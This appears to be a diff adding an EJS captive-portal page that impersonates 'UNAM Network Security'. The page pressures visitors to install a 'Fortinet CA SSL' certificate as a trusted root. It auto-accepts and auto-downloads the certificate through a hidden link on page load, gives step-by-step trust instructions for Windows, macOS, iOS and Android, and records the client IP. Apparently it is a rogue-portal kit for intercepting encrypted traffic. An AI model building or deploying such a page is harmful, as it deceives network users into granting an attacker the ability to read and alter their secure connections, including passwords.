@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UNAM - Security Certificate Required</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔐 UNAM Network Security</h1>
+            <p class="subtitle">Install UNAM security certificate to access the network</p>
+        </header>
+
+        <section class="captive-portal-content">
+            <div class="security-notice">
+                <h2>🛡️ UNAM Network Security Notice</h2>
+                <p>To ensure secure browsing on the UNAM network, you need to install and trust our security certificate on your device.</p>
+                <p><strong>Detected Device:</strong> <span class="device-info"><%= deviceType.charAt(0).toUpperCase() + deviceType.slice(1) %></span></p>
+            </div>
+
+            <div class="certificate-actions">
+                <h3>Automatic Certificate Installation</h3>
+                <p>Your security certificate is being automatically downloaded and prepared for installation...</p>
+
+                <div class="auto-install-notice">
+                    <p><strong>What's happening:</strong></p>
+                    <ul>
+                        <li>✅ Accepting security certificate automatically</li>
+                        <li>⬇️ Downloading security certificate file</li>
+                        <li>🔧 Preparing installation instructions</li>
+                    </ul>
+                </div>
+
+                <button onclick="acceptCertificate()" class="btn btn-secondary" id="manual-start" style="display: none;">
+                    🔄 Start Manual Installation
+                </button>
+
+                <div id="installation-steps" style="display: none;">
+                    <div class="progress-indicator">
+                        <div class="step active" id="step-accept">
+                            <span class="step-number">1</span>
+                            <span>Accept Certificate</span>
+                        </div>
+                        <div class="step" id="step-download">
+                            <span class="step-number">2</span>
+                            <span>Download</span>
+                        </div>
+                        <div class="step" id="step-install">
+                            <span class="step-number">3</span>
+                            <span>Install</span>
+                        </div>
+                        <div class="step" id="step-complete">
+                            <span class="step-number">4</span>
+                            <span>Complete</span>
+                        </div>
+                    </div>
+
+                    <div id="download-section" style="display: none;">
+                        <h3>Step 2: Download the certificate</h3>
+                        <p>Download the security certificate file to your device:</p>
+                        <a href="/download-certificate?device=<%= deviceType %>"
+                           class="btn btn-download"
+                           onclick="markDownloaded()"
+                           download>
+                            📥 Download security certificate
+                        </a>
+                    </div>
+
+                    <div id="instructions-section" style="display: none;">
+                        <h3>Step 3: Install Certificate</h3>
+                        <div class="device-specific-instructions">
+                            <% if (deviceType === 'windows') { %>
+                                <div class="quick-instructions">
+                                    <h4>Windows Installation:</h4>
+                                    <ol>
+                                        <li>Double-click the downloaded certificate file</li>
+                                        <li>Click "Install Certificate"</li>
+                                        <li>Select "Local Machine" and click Next</li>
+                                        <li>Select "Place all certificates in the following store"</li>
+                                        <li>Click "Browse" and select "Trusted Root Certification Authorities"</li>
+                                        <li>Click Next, then Finish</li>
+                                    </ol>
+                                </div>
+                            <% } else if (deviceType === 'macos') { %>
+                                <div class="quick-instructions">
+                                    <h4>macOS Installation:</h4>
+                                    <ol>
+                                        <li>Double-click the downloaded certificate file</li>
+                                        <li>Keychain Access will open - select "System" keychain</li>
+                                        <li>Click "Add" to import the certificate</li>
+                                        <li>Enter your password when prompted</li>
+                                        <li>Double-click the imported certificate</li>
+                                        <li>Expand "Trust" and set to "Always Trust"</li>
+                                        <li>Close and enter password again to save</li>
+                                    </ol>
+                                </div>
+                            <% } else if (deviceType === 'ios') { %>
+                                <div class="quick-instructions">
+                                    <h4>iOS Installation:</h4>
+                                    <ol>
+                                        <li>After download, go to Settings app</li>
+                                        <li>Tap "Profile Downloaded" (appears at top)</li>
+                                        <li>Tap "Install" in top-right corner</li>
+                                        <li>Enter your device passcode</li>
+                                        <li>Tap "Install" again, then "Done"</li>
+                                        <li>Go to Settings → General → About → Certificate Trust Settings</li>
+                                        <li>Enable full trust for your certificate</li>
+                                    </ol>
+                                </div>
+                            <% } else if (deviceType === 'android') { %>
+                                <div class="quick-instructions">
+                                    <h4>Android Installation:</h4>
+                                    <ol>
+                                        <li>Go to Settings → Security → Encryption & credentials</li>
+                                        <li>Tap "Install a certificate" → "CA certificate"</li>
+                                        <li>Tap "Install anyway" if warned</li>
+                                        <li>Browse to Downloads folder and select certificate</li>
+                                        <li>Enter a name for the certificate</li>
+                                        <li>Tap "OK" to complete installation</li>
+                                    </ol>
+                                </div>
+                            <% } %>
+                        </div>
+
+                        <div class="instruction-buttons">
+                            <a href="/instructions/<%= deviceType %>?redirect=true"
+                               class="btn btn-secondary"
+                               target="_blank">
+                                📋 View Detailed Instructions
+                            </a>
+
+                            <button onclick="markInstalled()"
+                                    class="btn btn-success"
+                                    id="installation-complete-btn">
+                                ✅ I've Installed the Certificate
+                            </button>
+
+                            <button onclick="autoDownload()"
+                                    class="btn btn-primary"
+                                    id="retry-download-btn">
+                                🔄 Download Again
+                            </button>
+                        </div>
+                    </div>
+
+                    <div id="completion-section" style="display: none;">
+                        <div class="success-message">
+                            <h3>🎉 Installation Complete!</h3>
+                            <p>Your security certificate has been successfully installed. You can now access the internet securely.</p>
+                            <p>You will be redirected to our website in <span id="countdown">5</span> seconds...</p>
+
+                            <div class="redirect-buttons">
+                                <button onclick="redirectNow()" class="btn btn-primary">
+                                    🌐 Continue to UNAM Portal
+                                </button>
+                                <button onclick="stayHere()" class="btn btn-secondary">
+                                    📋 View Installation Summary
+                                </button>
+                            </div>
+                        </div>
+
+                        <div id="installation-summary" style="display: none;">
+                            <h4>Installation Summary</h4>
+                            <div class="summary-details">
+                                <p><strong>Device:</strong> <%= deviceType.charAt(0).toUpperCase() + deviceType.slice(1) %></p>
+                                <p><strong>IP Address:</strong> <%= clientIp %></p>
+                                <p><strong>Certificate:</strong> Fortinet CA SSL Certificate Successfully Installed</p>
+                                <p><strong>Status:</strong> Ready for secure network access</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="help-section">
+                <h3>Need Help?</h3>
+                <div class="help-buttons">
+                    <a href="/instructions/<%= deviceType %>"
+                       class="help-btn"
+                       target="_blank">
+                        📱 <%= deviceType.charAt(0).toUpperCase() + deviceType.slice(1) %> Instructions
+                    </a>
+                    <button onclick="showTroubleshooting()" class="help-btn">
+                        🔧 Troubleshooting
+                    </button>
+                </div>
+
+                <div id="troubleshooting" style="display: none;" class="troubleshooting">
+                    <h4>Common Issues:</h4>
+                    <ul>
+                        <li><strong>Certificate won't download:</strong> Try using a different browser or check your internet connection</li>
+                        <li><strong>Installation failed:</strong> Make sure you have administrator privileges on your device</li>
+                        <li><strong>Still seeing security warnings:</strong> Restart your browser after installation</li>
+                        <li><strong>Can't find certificate settings:</strong> Use your device's search function to find "certificate" or "security"</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>&copy; 2024 UNAM | Network Security Portal</p>
+        </footer>
+    </div>
+
+    <script>
+        let currentStep = 0;
+        let countdownInterval;
+        let deviceType = '<%= deviceType %>';
+        let autoDownloadAttempted = false;
+
+        // Auto-download and install attempt on page load
+        window.onload = function() {
+            // Automatically accept certificate and start download
+            setTimeout(() => {
+                acceptCertificate();
+            }, 2000); // 2 second delay to let page fully load
+
+            // Show manual button as fallback after some time
+            setTimeout(() => {
+                document.getElementById('manual-start').style.display = 'inline-block';
+            }, 30000); // Show manual option after 30 seconds
+        };
+
+        async function acceptCertificate() {
+            try {
+                console.log('Sending certificate acceptance request...');
+                const response = await fetch('/accept-certificate', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: 'captive_user_' + Date.now()
+                    })
+                });
+
+                console.log('Response status:', response.status);
+                console.log('Response ok:', response.ok);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.error('Server error:', errorText);
+                    alert(`Server error (${response.status}): ${errorText}`);
+                    return;
+                }
+
+                const result = await response.json();
+                console.log('Response data:', result);
+
+                if (result.success) {
+                    // Hide the manual start button if it's visible
+                    const manualBtn = document.getElementById('manual-start');
+                    if (manualBtn) {
+                        manualBtn.style.display = 'none';
+                    }
+                    document.getElementById('installation-steps').style.display = 'block';
+                    nextStep();
+                } else {
+                    console.error('Certificate acceptance failed:', result);
+                    alert(result.error || 'Failed to accept certificate. Please try again.');
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                console.error('Error details:', error.message, error.stack);
+                alert('Network error: ' + error.message + '. Please check browser console for details.');
+            }
+        }
+
+        function nextStep() {
+            const steps = document.querySelectorAll('.step');
+
+            if (currentStep < steps.length) {
+                steps[currentStep].classList.add('completed');
+                currentStep++;
+
+                if (currentStep < steps.length) {
+                    steps[currentStep].classList.add('active');
+                }
+
+                switch (currentStep) {
+                    case 1:
+                        document.getElementById('download-section').style.display = 'block';
+                        // Auto-trigger download
+                        setTimeout(() => {
+                            autoDownload();
+                        }, 1000);
+                        break;
+                    case 2:
+                        document.getElementById('instructions-section').style.display = 'block';
+                        break;
+                    case 3:
+                        showCompletion();
+                        break;
+                }
+            }
+        }
+
+        function markDownloaded() {
+            setTimeout(() => {
+                nextStep();
+                // Attempt automatic installation after download
+                attemptAutoInstall();
+            }, 1000);
+        }
+
+        function attemptAutoInstall() {
+            if (deviceType === 'ios') {
+                // For iOS, try to trigger profile installation
+                alert('Certificate downloaded! Please go to Settings > General > VPN & Device Management to install the profile, then return here to continue.');
+            } else if (deviceType === 'android') {
+                // For Android, provide direct instructions
+                alert('Certificate downloaded! Please go to Settings > Security > Install from storage to install the certificate, then return here to continue.');
+            } else if (deviceType === 'macos' || deviceType === 'windows') {
+                // For desktop, provide instructions
+                alert('Certificate downloaded! Please double-click the downloaded certificate file to install it, then return here to continue.');
+            }
+
+            // Auto-advance after a delay to give user time to install
+            setTimeout(() => {
+                if (confirm('Have you completed the certificate installation?')) {
+                    markInstalled();
+                }
+            }, 10000); // 10 second delay
+        }
+
+        // Auto-download function
+        function autoDownload() {
+            if (!autoDownloadAttempted) {
+                autoDownloadAttempted = true;
+                // Create invisible download link and click it
+                const downloadLink = document.createElement('a');
+                downloadLink.href = `/download-certificate?device=${deviceType}`;
+                downloadLink.download = 'Fortinet_CA_SSL.cer';
+                downloadLink.style.display = 'none';
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+
+                // Mark download as completed
+                setTimeout(() => {
+                    markDownloaded();
+                }, 2000);
+            }
+        }
+
+        async function markInstalled() {
+            try {
+                const response = await fetch('/certificate-installed', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    nextStep();
+                } else {
+                    alert('Failed to complete installation. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            }
+        }
+
+        function showCompletion() {
+            document.getElementById('completion-section').style.display = 'block';
+            startCountdown();
+        }
+
+        function startCountdown() {
+            let seconds = 5;
+            const countdownEl = document.getElementById('countdown');
+
+            countdownInterval = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = seconds;
+
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    redirectNow();
+                }
+            }, 1000);
+        }
+
+        function redirectNow() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+            window.location.href = '/redirect';
+        }
+
+        function stayHere() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+            document.getElementById('installation-summary').style.display = 'block';
+            document.querySelector('.redirect-buttons').style.display = 'none';
+        }
+
+        function showTroubleshooting() {
+            const troubleshooting = document.getElementById('troubleshooting');
+            troubleshooting.style.display = troubleshooting.style.display === 'none' ? 'block' : 'none';
+        }
+    </script>
+</body>
+</html>
